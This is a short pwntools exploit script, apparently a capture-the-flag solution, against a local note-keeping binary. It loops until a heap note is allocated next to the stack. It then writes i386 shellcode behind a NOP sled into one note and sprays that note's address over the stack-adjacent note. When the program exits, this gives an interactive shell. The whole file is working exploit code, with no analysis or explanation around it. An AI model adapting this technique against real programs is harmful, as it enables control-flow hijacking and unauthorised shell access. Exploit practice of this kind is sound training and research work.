from pwn import *

io = process("./note")
def create_note():
    io.sendlineafter(b'5. exit\n', b'1')
    io.recvuntil(b'no ')
    addr_no = int(io.recvline(), 10)
    io.recvuntil(b' [')
    addr = int(io.recvuntil(b']')[:-1], 16)
    log.success('Create {} note at: {}'.format(addr_no, hex(addr)))
    return addr_no, addr

def write_note(no, msg): # no: int, msg: bytes
    io.sendlineafter(b'5. exit\n', b'2')
    io.recvline() # note no?
    io.sendline(str(no).encode())
    io.recvuntil(b'paste your note (MAX : 4096 byte)\n')
    io.sendline(msg)

def delete_note(no):
    io.sendlineafter(b'5. exit\n', b'4')
    io.recvuntil(b'note no?\n')
    io.sendline(str(no).encode())
    log.success("Delete note: %s"%str(no))

stack_addr = 0xffffffff
stack_no = 0
while True:
    no, addr = create_note()
    if no == 255:
        for i in range(256):
            delete_note(i)
        stack_addr -= 0x430*255
    stack_addr -= 0x430
    if addr > stack_addr:
        stack_no = no
        stack_addr = addr
        break
    log.success('Heap at: %#x\n', addr)
    log.success('Stack at: %#x\n', stack_addr)


shellcode = asm(shellcraft.i386.linux.sh())
shellcode_no, shellcode_addr = create_note()
write_note(shellcode_no, shellcode.rjust(200, b'\x90'))
write_note(stack_no, p32(shellcode_addr)*1024)
io.sendlineafter(b'5. exit\n', b'5')
io.interactive()